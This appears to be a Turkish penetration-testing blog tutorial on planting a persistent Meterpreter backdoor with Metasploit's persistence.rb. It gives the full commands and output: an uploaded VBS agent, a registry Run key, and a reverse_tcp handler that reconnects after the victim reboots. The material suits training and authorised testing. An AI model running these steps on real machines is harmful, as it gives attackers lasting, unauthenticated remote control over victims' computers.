---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-15T13:57:00Z"
excerpt: Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework
  içinde kullanabileceğiniz bir diğer yöntem de persistence.rb script kodunu kullanmaktır.
guid: https://www.siberoloji.com/?p=1217
id: 1217
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Kalıcı Backdoor
url: /tr/msf-meterpreter-kalici-backdoor/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="persistencerb">Persistence.rb 
<!-- /wp:heading -->

  Hedef sistemde oturum açtıktan sonra kalıcılık sağlamak için Metasploit Framework içinde kullanabileceğiniz bir diğer yöntem de&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmaktır.</p>
 

  Bu yöntem sayesinde, hedef bilgisayar güncellense bile tekrar bağlanma imkanınız bulunmaktadır. Ayrıca, hedef sistemin tekrar başlatılması da bağlantı yapmayı etkilemeyecektir.</p>
 

  Bir önceki konuda,&nbsp;<code>metsvc</code>&nbsp;için yaptığımız uyarıyı burada da tekrarlayalım.&nbsp;<code>persistence.rb</code>&nbsp;arka kapısı, bağlantı için herhangi bir oturum bilgisi kullanmaz. Bu açıklığı keşfeden herkes bağlantı sağlayabilir.</p>
 

  Hedef sistemde meterpreter oturum açtıktan sonra&nbsp;<code>persistence.rb</code>&nbsp;script kodunu kullanmadan önce yardım bilgilerini görüntüleyelim ve bize hangi imkanları sağladığını görelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run persistence -h

<strong>[!]</strong> Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
<strong>[!]</strong> Example: run post/windows/manage/persistence_exe OPTION<strong>=</strong>value <strong>[</strong>...]
Meterpreter Script <strong>for </strong>creating a persistent backdoor on a target host.

OPTIONS:

    -A   Automatically start a matching exploit/multi/handler to connect to the agent
    -L   Location <strong>in </strong>target host to write payload to, <strong>if </strong>none %TEMP% will be used.
    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
    -S   Automatically start the agent on boot as a service <strong>(</strong>with SYSTEM privileges<strong>)</strong>
    -T   Alternate executable template to use
    -U   Automatically start the agent when the User logs on
    -X   Automatically start the agent when the system boots
    -h   This help menu
    -i   The interval <strong>in </strong>seconds between each connection attempt
    -p   The port on which the system running Metasploit is listening
    -r   The IP of the system running Metasploit listening <strong>for </strong>the connect back
</code></pre>
<!-- /wp:code -->

  Aşağıdaki&nbsp;<code>persistence -U -i 5 -p 443 -r 192.168.1.71</code>&nbsp;komutu hangi işlemleri yapıyor?</p>
 

  <code>-U</code>, bir kullanıcı oturum açtığında bizim bilgisayarımıza otomatik bağlantı yapılmasını sağlar.</p>
 

  <code>-i 5</code>&nbsp;Karşe taraftaki&nbsp;<code>persistence.rb</code>&nbsp;script kodu her 5 saniyede bir bize bağlanmaya çalışır.</p>
 

  <code>-p 443</code>&nbsp;bizim dinleme yapan bilgisayarımızın dinleme yaptığı port numarasıdır.</p>
 

  <code>-r 192.168.1.71</code>&nbsp;bizim dinleme yapan bilgisayarımızın IP numarasıdır.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run persistence -U -i 5 -p 443 -r 192.168.1.71
<strong>[</strong><strong>*</strong><strong>]</strong> Creating a persistent agent: LHOST<strong>=</strong>192.168.1.71 LPORT<strong>=</strong>443 <strong>(</strong>interval<strong>=</strong>5 onboot<strong>=</strong>true<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Persistent agent script is 613976 bytes long
<strong>[</strong><strong>*</strong><strong>]</strong> Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
<strong>[</strong><strong>*</strong><strong>]</strong> Agent executed with PID 492
<strong>[</strong><strong>*</strong><strong>]</strong> Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
<strong>[</strong><strong>*</strong><strong>]</strong> Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
<strong>[</strong><strong>*</strong><strong>]</strong> For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Verdiğimiz komut sonucunda başlatılan script, çıktılarda da görüleceği gibi işimiz tamamlandığında log temizleme işleminin nasıl yapılabileceğini de gösteriyor.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
</code></pre>
<!-- /wp:code -->

  Scriptin çalışıp çalışmadığını ve otomatik bağlantı yapıp yapmadığını, hedef bilgisayarı tekrar başlatarak anlayabiliriz. Hedef bilgisayarı yeniden başlatalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> reboot
Rebooting...
meterpreter <strong>&gt;</strong> exit

<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 3 closed.  Reason: User exit
</code></pre>
<!-- /wp:code -->

  Dinleyici&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü tekrar başlatalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> use exploit/multi/handler
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD <strong>=&gt;</strong> windows/meterpreter/reverse_tcp
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LHOST 192.168.1.71
LHOST <strong>=&gt;</strong> 192.168.1.71
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> set LPORT 443
LPORT <strong>=&gt;</strong> 443
msf exploit<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler on 192.168.1.71:443
<strong>[</strong><strong>*</strong><strong>]</strong> Starting the payload handler...
</code></pre>
<!-- /wp:code -->

  Hedef bilgisayar tekrar başladığında, oturum açılır açılmaz yerel bilgisayara bağlantı, aşağıda görüldüğü gibi tekrar sağlanacaktır.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>748544 bytes<strong>)</strong> to 192.168.1.161
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 5 opened <strong>(</strong>192.168.1.71:443 -&gt; 192.168.1.161:1045<strong>)</strong> at 2010-08-21 12:31:42 -0600

meterpreter <strong>&gt;</strong> sysinfo
Computer: XEN-XP-SP2-BARE
OS      : Windows XP <strong>(</strong>Build 2600, Service Pack 2<strong>)</strong>.
Arch    : x86
Language: en_US
meterpreter <strong>&gt;</strong></code></pre>
<!-- /wp:code -->